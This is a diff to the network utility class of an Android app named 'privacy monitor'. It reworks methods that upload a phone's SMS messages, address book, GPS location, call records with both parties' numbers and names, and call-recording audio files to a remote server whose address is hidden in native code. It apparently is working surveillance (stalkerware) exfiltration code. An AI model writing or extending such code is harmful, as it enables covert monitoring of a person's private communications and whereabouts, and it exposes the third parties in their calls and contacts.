@@ -2,6 +2,7 @@ package com.privacy.monitor.util;
 
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
+import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStream;
@@ -13,7 +14,6 @@ import java.net.MalformedURLException;
 import java.net.Proxy;
 import java.net.URL;
 import com.privacy.monitor.base.C;
-import com.privacy.monitor.service.utilservice.ClientSocket;
 import android.content.Context;
 
 /**
@@ -31,18 +31,10 @@ public class NetworkUtil {
 	public static native String getURL();
 	
 	
-	
-	/**
-	 * 上传文件
-	 * @param ctx 上下文
-	 * @param url 上传文件的url
-	 * @param object 上传文件的内容
-	 * @return 响应结果
-	 */
-	public static InputStream upload(Context ctx,String updateData,String requestMethod){
+	public static String uploadSMS(Context ctx,String updateData,String requestMethod){
 		URL url = null;
 		HttpURLConnection conn = null;
-		InputStream is = null;
+		String result = "";
 		try {
 			String strUrl = getURL();
 			strUrl = strUrl+"/"+requestMethod;
@@ -65,27 +57,34 @@ public class NetworkUtil {
 			conn.setRequestProperty("Content-Length",datas.length+"");
 			conn.getOutputStream().write(datas);
 			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
-				Logger.d("NewworkUtil","上传数据成功");
-				is = conn.getInputStream();
+				Logger.d("NetworkUtil","上传短信成功");
+				InputStreamReader isr = new InputStreamReader(conn.getInputStream());
+				BufferedReader br = new BufferedReader(isr);
+				String temp = null;
+				while ((temp = br.readLine()) != null) {
+					result = result + temp;
+				}
+				isr.close();
+			}else {
+				result = "FAIL: " + conn.getResponseCode();
 			}
 			
 		} catch (Exception e) {
-			if(e.getMessage() !=null){
-				Logger.d("NetworkUtil",e.getMessage());
-			}
-			return null;
+				result = "FAIL";
 		}
-		return is;
+		return result;
 	}
 	
+	
+	
 	/**专用于上传定位信息*/
-	public static synchronized void sendLocInfo(String device_id, String lon, String lat, String loc_name, String locTime, String requestMethod) {
+	public static synchronized void sendLocInfo(String key,String device_id, String lon, String lat, String loc_name, String locTime, String requestMethod) {
 		try {
 			String strUrl = getURL();
 			strUrl = strUrl+"/"+requestMethod;
 			URL url = new URL(strUrl);
-
-			String param = "key=" + ClientSocket.APP_REQ_KEY + "&device_id=" + device_id + "&lon=" + lon+"&lat="+lat+"&loc_name="+loc_name+"&time="+locTime;
+			Logger.d("Net","正在上传定位信息");
+			String param = "key=" + key + "&device_id=" + device_id + "&lon=" + lon+"&lat="+lat+"&loc_name="+loc_name+"&time="+locTime;
 
 			Logger.d("NetworkUtil",param);
 
@@ -121,10 +120,11 @@ public class NetworkUtil {
 	 * @param object 上传文件的内容
 	 * @return 响应结果
 	 */
-	public static InputStream upload2(Context ctx,String updateData,String requestMethod){
+	public static String uploadBook(Context ctx,String updateData,String requestMethod){
 		URL url = null;
 		HttpURLConnection conn = null;
 		InputStream is = null;
+		String result = "";
 		try {
 			String strUrl = getURL();
 			strUrl = strUrl+"/"+requestMethod;
@@ -147,17 +147,21 @@ public class NetworkUtil {
 			conn.setRequestProperty("Content-Length",datas.length+"");
 			conn.getOutputStream().write(datas);
 			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
-				Logger.d("NewworkUtil","上传数据成功");
-				is = conn.getInputStream();
+				InputStreamReader isr = new InputStreamReader(conn.getInputStream());
+				BufferedReader br = new BufferedReader(isr);
+				String temp = null;
+				while ((temp = br.readLine()) != null) {
+					result = result + temp;
+				}
+				isr.close();
+			} else {
+				result = "FAIL: " + conn.getResponseCode();
 			}
 			
 		} catch (Exception e) {
-			if(e.getMessage() !=null){
-				Logger.d("NetworkUtil",e.getMessage());
-			}
-			return null;
+			result = "FAIL";
 		}
-		return is;
+		return result;
 	}
 	
 	/**
@@ -240,23 +244,12 @@ public class NetworkUtil {
 		return is;
 	}
 	
-	public static String uploadCall(String my_num,String you_num,String you_name,String start_time,String end_time,String sim_id,String lon,String lat,String device_name,String type){
-		String PARAM_TEMP = "my_num=@MYNUM&you_num=@YOUNUM&your_name=@YOUNAME&start=@START&end=@END&sim_id=@SIM&lon=@LON&lat=@LAT&device=@DEVICE&type=@TYPE";
+	public static String uploadCall(String params,String requestMethod){
 		String result = "";
 		try {
-			String strUrl=getURL()+"/"+C.RequestMethod.uploadCallRecord;
+			String strUrl=getURL()+"/"+requestMethod;
 			URL url = new URL(strUrl);
-			String param = PARAM_TEMP;
-			param = param.replace("@MYNUM", my_num);
-			param = param.replace("@YOUNUM", you_num);
-			param = param.replace("@YOUNAME", you_name);
-			param = param.replace("@START", start_time+"");
-			param = param.replace("@END", end_time+"");
-			param = param.replace("@SIM", sim_id);
-			param = param.replace("@LON", lon);
-			param = param.replace("@LAT", lat);
-			param = param.replace("@DEVICE", device_name);
-			param = param.replace("@TYPE", type+"");
+		
 			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
 			conn.setConnectTimeout(30000);
 			conn.setReadTimeout(30000);
@@ -264,7 +257,7 @@ public class NetworkUtil {
 			conn.setDoInput(true);
 			conn.setUseCaches(false);
 			conn.setRequestMethod("POST");
-			conn.getOutputStream().write(param.getBytes());
+			conn.getOutputStream().write(params.getBytes());
 		    if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
 		    	Logger.d("NewworkUtil","上传通话记录数据成功");
 		     	InputStream inputStream = conn.getInputStream();
@@ -273,19 +266,33 @@ public class NetworkUtil {
 		     	}
 		    }
 		    result = "FAIL:"+conn.getResponseCode();
-	     	return result;
 		} catch (Exception e) {
-			Logger.e("NetworkUtil",e.getMessage());
 			result = "FAIL: exception";
-			return result;
+			
 		}
+		return result;
 	}
 	
+	
+	
 	/**上传文件*/
-	public static String uploadFile(String addCallResult,String filePath){
-		String result = "OK";
+	public static String uploadFile(String filePath,String fileName,String requestMethod){
+		String result = "";
 		try {
-			URL url = new URL(getURL()+C.RequestMethod.uploadCallSound);
+			File file = new File(filePath);
+			
+			if(!file.exists()){
+				Logger.d("NetworkUtil","文件不存在");
+				 return "FAIL";
+			}else {
+				long fileSize= file.length();
+				if(fileSize <=0){
+
+					Logger.d("NetworkUtil","文件不存在");
+					return "FAIL";
+				}
+			}
+			URL url = new URL(getURL()+"/"+requestMethod);
 			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
 			conn.setDoInput(true);
 			conn.setDoOutput(true);
@@ -296,7 +303,7 @@ public class NetworkUtil {
 			conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + "******");
 			DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
 			dos.writeBytes("--******\r\n");
-			dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\""+addCallResult+"\"" + "\r\n");
+			dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\""+fileName+"\"" + "\r\n");
 			dos.writeBytes("\r\n");
 			FileInputStream fis = new FileInputStream(filePath);
 			byte[] buffer = new byte[8192]; // 8k
@@ -312,21 +319,25 @@ public class NetworkUtil {
 				Logger.d("NetworkUtil","上传录音文件成功");
 				InputStream is = conn.getInputStream();
 			   return AppUtil.streamToStr(is);
+			}else {
+				InputStream is = conn.getInputStream();
+				InputStreamReader isr = new InputStreamReader(is, "utf-8");
+				BufferedReader br = new BufferedReader(isr);
+				result = "FAIL:"+br.readLine();
 			}
-			result = "FAULT";
 		} catch (MalformedURLException e) {
-			Logger.e("NetworkUtil",e.getMessage());
+			result = "FAIL";
 		} catch (IOException e) {
-			Logger.e("NetworkUtil",e.getMessage());
+			result = "FAIL";
 		}
 		return result;
 	}
 	
-	/**上传文件*/
-	public static String uploadFile(String addCallResult,InputStream inputStream){
-		String result = "OK";
+	/**上传文件信息*/
+	public static String uploadFileInfo(String params,String requestMethod){
+		String result = "";
 		try {
-			String strURL = getURL()+"/"+C.RequestMethod.uploadCallSound;
+			String strURL = getURL()+"/"+C.RequestMethod.uploadCallSoundFile;
 			Logger.d("NetworkUtil",strURL);
 			URL url = new URL(strURL);
 			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -334,34 +345,24 @@ public class NetworkUtil {
 			conn.setDoOutput(true);
 			conn.setUseCaches(false);
 			conn.setRequestMethod("POST");
-			conn.setRequestProperty("Connection", "Keep-Alive");
 			conn.setRequestProperty("Charset", "UTF-8");
-			conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + "******");
-			DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
-			dos.writeBytes("--******\r\n");
-			dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\""+addCallResult+"\"" + "\r\n");
-			dos.writeBytes("\r\n");
-			
-			byte[] buffer = new byte[8192]; // 8k
-			int count = 0;
-			while ((count = inputStream.read(buffer)) != -1) {
-				dos.write(buffer, 0, count);
+			conn.getOutputStream().write(params.getBytes());
+			if (conn.getResponseCode() == 200) {
+				InputStreamReader isr = new InputStreamReader(conn.getInputStream());
+				BufferedReader br = new BufferedReader(isr);
+				String temp = null;
+				while ((temp = br.readLine()) != null) {
+					result = result + temp;
+				}
+				isr.close();
+			} else {
+				result = "FAIL: " + conn.getResponseCode();
 			}
-			inputStream.close();
-			dos.writeBytes("\r\n");
-			dos.writeBytes("--******--\r\n");
-			dos.flush();
 			
-			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
-				Logger.d("NetworkUtil","上传录音文件成功");
-				InputStream is = conn.getInputStream();
-			   return AppUtil.streamToStr(is);
-			}
-			result = "FAULT";
 		} catch (MalformedURLException e) {
-			Logger.e("NetworkUtil",e.getMessage());
+			result = "FAIL";
 		} catch (IOException e) {
-			Logger.e("NetworkUtil",e.getMessage());
+			result = "FAIL";
 		}
 		return result;
 	}
